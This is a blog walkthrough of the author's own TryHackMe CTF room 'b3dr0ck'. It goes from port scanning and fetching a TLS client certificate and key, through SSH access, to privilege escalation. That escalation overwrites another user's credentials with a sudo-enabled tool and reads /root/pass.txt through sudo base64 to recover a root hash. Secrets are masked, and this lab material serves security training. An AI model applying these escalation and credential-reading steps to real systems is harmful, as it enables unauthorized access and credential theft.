---
layout: post
title: 'b3dr0ck - {THM} Room'
description: >-
  Created my first CTF room on TryHackMe! Gain access to the ABC servers, using
  lightweight custom TCP/TLS/HTTPS services. Learn about TLS certificate
  authorization and more!
image: /assets/img/b3dr0ck/gazoo.png
permalink: /blog/thm-b3dr0ck/
private: true
published: true
password: YzJodmQyMWxaR0Z0YjI1bGVRPT0=
password_hint: Double B64 encoded (not secure, just a hurdle)
categories:
  - tryhackme
  - hacking
  - openssl
  - https
  - thm
  - ctf
  - b3dr0ck
  - flintstones
  - f11snipe
  - linux
  - tls
  - ssl

---
<h3>Join room here: <a title="Join this room!" href="https://tryhackme.com/jr/b3dr0ck" target="_blank" rel="noopener">tryhackme.com/jr/b3dr0ck</a></h3>
<p>Signup for TryHackMe today! <a title="Try Hack Me Homepage" href="https://tryhackme.com/" target="_blank" rel="noopener">tryhackme.com</a></p>
<p><img src="https://sls-ci-bowtie-houndstooth-root-us-east-1-assets.s3.amazonaws.com/5290charlie/blog/1650051940425-BqXFc-1565710625-263-show-flintstones_header_940x370 (1).jpg" alt="Fred &amp; Barney" width="766" height="300" /></p>
<h3>Context (THM Task)</h3>
<p>Barney is setting up the ABC webserver, and trying to use TLS certs to secure connections, but he's having trouble ...</p>
<ul>
<li>He was able to establish nginx on port <strong>80</strong>,&nbsp; redirecting to a custom TLS webserver on port <strong>4040</strong> -</li>
<li>There is a TCP socket listening with a simple service to help retrieve TLS credential files (client key &amp; certificate)</li>
<li>There is another TCP(TLS) helper service listening for authorized connections using files obtained from above service</li>
<li>Can you find all the eastereggs?</li>
</ul>
<h3>Steps</h3>
<ul>
<li>Start Machine and wait for VM ip address</li>
<li>Placeholders:
<ul>
<li><strong>${VMIP}&nbsp;</strong>= IP Address of Virtual Machine (<span style="text-decoration: underline;"><em>b3dr0ck.vX)</em></span></li>
<li><strong>${VPNIP}&nbsp;</strong>= IP Address of VPN (tun0) or AttackBox (10.10.x.x)</li>
</ul>
</li>
<li>First test http connection to http://<strong>${VMIP}</strong>/ (default port 80)
<ul>
<li>Looks like it redirects to https://<strong>${VMIP}</strong>:4040/</li>
<li><img src="https://sls-ci-bowtie-houndstooth-root-us-east-1-assets.s3.amazonaws.com/5290charlie/blog/1649630285347-b3dr0ck-https.png" alt="https connection" width="368" height="278" /></li>
<li>Accept self-signed cert and continue</li>
<li><img src="https://sls-ci-bowtie-houndstooth-root-us-east-1-assets.s3.amazonaws.com/5290charlie/blog/1649630512983-b3dr0ck-https-open.png" alt="" width="365" height="277" /></li>
<li>Ok, looks like we found the homepage. Let's see what nmap shows us</li>
</ul>
</li>
<li>Run nmap port scan
<ul>
<li>
<pre>$ nmap -v -T4 <strong>${VMIP}</strong> 
Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-10 16:48 MDT
Initiating Ping Scan at 16:48
Scanning ${VMIP} [2 ports]
Completed Ping Scan at 16:48, 0.12s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:48
Completed Parallel DNS resolution of 1 host. at 16:48, 0.00s elapsed
Initiating Connect Scan at 16:48
Scanning ${VMIP} [1000 ports]
Discovered open port 22/tcp on ${VMIP}
Discovered open port 80/tcp on ${VMIP}
Discovered open port 9009/tcp on ${VMIP}
Completed Connect Scan at 16:48, 9.02s elapsed (1000 total ports)
Nmap scan report for ${VMIP}
Host is up (0.12s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9009/tcp open  pichat

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 9.16 seconds</pre>
</li>
<li>Hmm port <strong>9009</strong> looks interesting, let's connect with&nbsp;<strong>netcat</strong></li>
</ul>
</li>
<li>Run&nbsp;<strong>netcat</strong> to test connecting to port&nbsp;<strong>9009</strong>
<ul>
<li>
<pre>$ netcat ${VMIP} 9009


 __          __  _                            _                   ____   _____ 
 \ \        / / | |                          | |            /\   |  _ \ / ____|
  \ \  /\  / /__| | ___ ___  _ __ ___   ___  | |_ ___      /  \  | |_) | |     
   \ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \    / /\ \ |  _ &lt;| |     
    \  /\  /  __/ | (_| (_) | | | | | |  __/ | || (_) |  / ____ \| |_) | |____ 
     \/  \/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  /_/    \_\____/ \_____|
                                                                               
                                                                               


What are you looking for?</pre>
</li>
<li>
<p>Cool! Connected to something ... what are we looking for here? Let's try&nbsp;<strong>ls</strong>...</p>
</li>
<li>
<pre>What are you looking for? ls
Sorry, unrecognized request: 'ls'

You use this service to recover your client certificate and private key</pre>
</li>
<li>Ok, so this prompt is here to help recover creds? What does&nbsp;<strong>help</strong> tell us?</li>
<li>
<pre>What are you looking for? help
Looks like the secure login service is running on port: 54321

Try connecting using:
socat stdio ssl:MACHINE_IP:54321,cert=&lt;CERT_FILE&gt;,key=&lt;KEY_FILE&gt;,verify=0</pre>
</li>
<li>Nice, that looks helpful... Let's try looking for the credentials</li>
<li>
<pre>What are you looking for? cert    
Sounds like you forgot your certificate. Let's find it for you...

-----BEGIN CERTIFICATE-----
****************************************************************
****************************************************************
****************************************************************
********
-----END CERTIFICATE-----
</pre>
</li>
<li>BOOM! Got a certificate! The other response mentioned a private key also, I wonder...</li>
<li>
<pre>What are you looking for? key
Sounds like you forgot your private key. Let's find it for you...
-----BEGIN RSA PRIVATE KEY-----
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************
-----END RSA PRIVATE KEY-----
</pre>
</li>
<li>Got it! Cool, let's save these to local files:&nbsp;<strong>client.crt</strong> and <strong>client.key</strong></li>
</ul>
</li>
<li>The previous&nbsp;<strong>help</strong> output mentioned <strong>"socat" </strong>connect with credentials over port <strong>54321</strong>. Let's try that<br />
<ul>
<li>
<pre>$ socat stdio ssl:<strong style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;">${VMIP}</strong>:54321,cert=client.crt,key=client.key,verify=0<br />

 __     __   _     _             _____        _     _             _____        _ 
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)
                                                                                 
                                                                                 

Welcome: 'Barney Rubble' is authorized.
b3dr0ck&gt; </pre>
</li>
<li>Yay! It authorized us as "Barney Rubble" (from the credentials we downloaded on&nbsp;<strong>9009</strong>)</li>
<li>What can we access here?</li>
<li>
<pre>b3dr0ck&gt; whoami
Current user = 'Barney Rubble' (valid peer certificate)
b3dr0ck&gt; ls
Unrecognized command: 'ls'

This service is for login and password hints<br />b3dr0ck&gt; help
Password hint: ******************************** (user = 'Barney Rubble')
</pre>
</li>
<li>
<p>Hmm, that hint looks more like a random password. Can we login?</p>
</li>
<li>
<pre>b3dr0ck&gt; login
Login is disabled. Please use SSH instead.</pre>
</li>
<li>Ok, let's try to access using SSH</li>
</ul>
</li>
<li>SSH as&nbsp;<strong>barney</strong> with password obtained above
<ul>
<li>
<pre>$ ssh barney@${VMIP}
The authenticity of host '${VMIP} (${VMIP})' can't be established.
ECDSA key fingerprint is SHA256:wQ21BG+EOKJCF/4/7AIY9n8e86E7MAN2gH/J/+koWk4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '${VMIP}' (ECDSA) to the list of known hosts.
barney@${VMIP}'s password: 

barney@b3dr0ck:~$</pre>
</li>
<li>
<p>We're in! Let's get the first flag:&nbsp;<strong>barney.txt</strong></p>
</li>
<li>
<pre>barney@b3dr0ck:~$ ls -l
total 4
-rw------- 1 barney barney 38 Apr 10 00:20 barney.txt
barney@b3dr0ck:~$ cat barney.txt 
THM{***}</pre>
</li>
</ul>
</li>
<li>Now we're on the machine as&nbsp;<strong>barney</strong> user, what can we do?
<ul>
<li>
<pre>barney@b3dr0ck:~$ sudo -l
[sudo] password for barney: 
Matching Defaults entries for barney on b3dr0ck:
    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User barney may run the following commands on b3dr0ck:
    (ALL : ALL) /usr/bin/certutil
</pre>
</li>
<li>Ok, so we can use sudo on&nbsp;<strong>certutil</strong>, let's check it out <br /><img src="/assets/img/check-it-out-steve-brule.gif" /></li>
<li>Try to run <strong>sudo certutil</strong> by itself to start with</li>
<li>
<pre>barney@b3dr0ck:~$ sudo certutil

Cert Tool Usage:
----------------

Show current certs:
  certutil ls

Generate new keypair:
  certutil [username] [fullname]
</pre>
</li>
<li>Ok cool, so this is some sort of tool to view and create keypair credentials</li>
<li>Let's try the <strong>sudo certutil ls</strong> first</li>
<li>
<pre>barney@b3dr0ck:~$ sudo certutil ls

Current Cert List: (/usr/share/abc/certs)
------------------
total 56
drwxrwxr-x 2 root root 4096 Apr 29 05:12 .
drwxrwxr-x 8 root root 4096 Apr 29 04:30 ..
-rw-r----- 1 root root  972 Apr 30 21:05 barney.certificate.pem
-rw-r----- 1 root root 1674 Apr 30 21:05 barney.clientKey.pem
-rw-r----- 1 root root  894 Apr 30 21:05 barney.csr.pem
-rw-r----- 1 root root 1678 Apr 30 21:05 barney.serviceKey.pem
-rw-r----- 1 root root  976 Apr 30 21:05 fred.certificate.pem
-rw-r----- 1 root root 1678 Apr 30 21:05 fred.clientKey.pem
-rw-r----- 1 root root  898 Apr 30 21:05 fred.csr.pem
-rw-r----- 1 root root 1678 Apr 30 21:05 fred.serviceKey.pem
</pre>
</li>
<li>Ok now we know where and how these keys/certs are managed</li>
<li>Let's try to create a new keypair!</li>
<li>
<pre>barney@b3dr0ck:~$ sudo certutil f11snipe "F11snipe FTW"
Generating credentials for user: f11snipe (F11snipe FTW)
Generated: clientKey for f11snipe: /usr/share/abc/certs/f11snipe.clientKey.pem
Generated: certificate for f11snipe: /usr/share/abc/certs/f11snipe.certificate.pem
-----BEGIN RSA PRIVATE KEY-----
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
****************************************************************
****************************************************************
****************************************************************
********
-----END CERTIFICATE-----
</pre>
</li>
<li>Nice! We've generated a fresh pair of credentials for a new user. Let's check <strong>certutil ls</strong> to see what it actually did</li>
<li>
<pre>barney@b3dr0ck:~$ sudo certutil ls

Current Cert List: (/usr/share/abc/certs)
------------------
total 72
drwxrwxr-x 2 root root 4096 Apr 30 21:14 .
drwxrwxr-x 8 root root 4096 Apr 29 04:30 ..
-rw-r----- 1 root root  972 Apr 30 21:05 barney.certificate.pem
-rw-r----- 1 root root 1674 Apr 30 21:05 barney.clientKey.pem
-rw-r----- 1 root root  894 Apr 30 21:05 barney.csr.pem
-rw-r----- 1 root root 1678 Apr 30 21:05 barney.serviceKey.pem
-rw-r--r-- 1 root root  972 Apr 30 21:14 f11snipe.certificate.pem
-rw-r--r-- 1 root root 1674 Apr 30 21:14 f11snipe.clientKey.pem
-rw-r--r-- 1 root root  894 Apr 30 21:14 f11snipe.csr.pem
-rw-r--r-- 1 root root 1678 Apr 30 21:14 f11snipe.serviceKey.pem
-rw-r----- 1 root root  976 Apr 30 21:05 fred.certificate.pem
-rw-r----- 1 root root 1678 Apr 30 21:05 fred.clientKey.pem
-rw-r----- 1 root root  898 Apr 30 21:05 fred.csr.pem
-rw-r----- 1 root root 1678 Apr 30 21:05 fred.serviceKey.pem
</pre>
</li>
<li>So we see 4 new files for our <strong>f11snipe</strong> user.</li>
<li>Based on the output from the create command, we know the "pair" we need is <strong>.certificate.pem</strong> and <strong>.clientKey.pem</strong></li>
<li>Let's connect to port <strong>54321</strong> with these creds and see what happens!</li>
<li>
<pre>socat stdio ssl:$VMIP:54321,cert=f11snipe.cert,key=f11snipe.key,verify=0


 __     __   _     _             _____        _     _             _____        _ 
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)
                                                                                 
                                                                                 

Welcome: 'F11snipe FTW' is authorized.
b3dr0ck&gt; help
Password hint: none (user = 'F11snipe FTW')
b3dr0ck&gt; 
</pre>
</li>
<li>Yay, We're in with our new credentials! But it looks like the hint is empty (new user)</li>
<li>Let's see if we can get here as user <strong>fred</strong></li>
<li>Back to <strong>certutil</strong>, let's try to overwrite fred's credentials with new ones we have access to</li>
<li>
<pre>barney@b3dr0ck:~$ sudo certutil fred "Fred Flintstone"
Generating credentials for user: fred (Fred Flintstone)
Generated: clientKey for fred: /usr/share/abc/certs/fred.clientKey.pem
Generated: certificate for fred: /usr/share/abc/certs/fred.certificate.pem
-----BEGIN RSA PRIVATE KEY-----
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
****************************************************************
****************************************************************
****************************************************************
********
-----END CERTIFICATE-----
</pre>
</li>
<li>It worked! The <strong>certutil</strong> tool doesn't validate or block on duplicate user/file names.</li>
<li>Let's connect again to port <strong>54321</strong> as fred with these creds</li>
<li>
<pre>socat stdio ssl:$VMIP:54321,cert=fred.cert,key=fred.key,verify=0


 __     __   _     _             _____        _     _             _____        _ 
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)
                                                                                 
                                                                                 

Welcome: 'Fred Flintstone' is authorized.
b3dr0ck&gt; help
Password hint: **************** (user = 'Fred Flintstone')
b3dr0ck&gt; 
</pre>
</li>
<li>There we go! Let's try ssh as <strong>fred</strong> now...</li>
<li>
<pre>ssh fred@$VMIP  
fred@10.10.215.234's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)

fred@b3dr0ck:~$ 
</pre>
</li>
<li>
<p>We're in as&nbsp;<strong>fred</strong>! Let's get next flag:&nbsp;<strong>fred.txt</strong></p>
</li>
<li>
<pre>fred@b3dr0ck:~$ cat fred.txt
cat fred.txt
THM{***}</pre>
</li>
<li>Woot! Let's keep going!</li>
</ul>
</li>
<li>Let's hunt around to see what&nbsp;<strong>fred</strong> can do...
<ul>
<li>Start searching for&nbsp;<strong>SUID</strong> files</li>
<li>
<pre>fred@b3dr0ck:~$ find / -type f -perm -04000 2&gt;/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/bin/chsh
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/mount
/usr/bin/fusermount
/usr/bin/at
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/su</pre>
</li>
<li>Hmm, nothing obvious here that we can find on&nbsp;<strong>GTFOBins</strong>... What else can we try? Let's check if&nbsp;<strong>fred</strong> can use&nbsp;<strong>sudo</strong></li>
<li>
<pre>fred@b3dr0ck:~$ sudo -l
Matching Defaults entries for fred on b3dr0ck:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on b3dr0ck:
    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt</pre>
</li>
<li>Interesting, user&nbsp;<strong>fred</strong> is allowed to use&nbsp;<strong>sudo</strong> for commands&nbsp;<strong>base32</strong> and&nbsp;<strong>base64</strong>, against what looks like root password&nbsp;<strong>/root/pass.txt</strong></li>
<li>Let's try to see what's in that file...</li>
<li>
<pre>fred@b3dr0ck:~$ sudo base64 /root/pass.txt | base64 --decode
************************************************************************</pre>
</li>
<li>Ok cool, that output still looks encoded... But looks more like&nbsp;<strong>base32</strong> than&nbsp;<strong>base64</strong>, let's keep decoding</li>
<li>
<pre>fred@b3dr0ck:~$ sudo base64 /root/pass.txt | base64 --decode | base32 --decode
********************************************</pre>
</li>
<li>So that worked, still looks encoded though ... now back in&nbsp;<strong>base64</strong>&nbsp;</li>
<li>
<pre>fred@b3dr0ck:~$ sudo base64 /root/pass.txt | base64 --decode | base32 --decode | base64 --decode
********************************</pre>
</li>
<li>There it is! That looks like password or hash ... let's try password first</li>
<li>
<pre>fred@b3dr0ck:~$ su - root
Password: 
su: Authentication failure
</pre>
</li>
<li>Hmm that's not it, looks like a hash... Let's check somewhere like <a title="Crack Station" href="https://crackstation.net/" target="_blank" rel="noopener">CrackStation</a></li>
<li>
<p>That was easy! Now let's get the final flag:&nbsp;<strong>root.txt</strong></p>
</li>
<li>
<pre>root@b3dr0ck:~# cat root.txt 
THM{***}</pre>
</li>
</ul>
</li>
</ul>
<p>Signup for TryHackMe today! <a title="Try Hack Me Homepage" href="https://tryhackme.com/" target="_blank" rel="noopener">tryhackme.com</a></p>
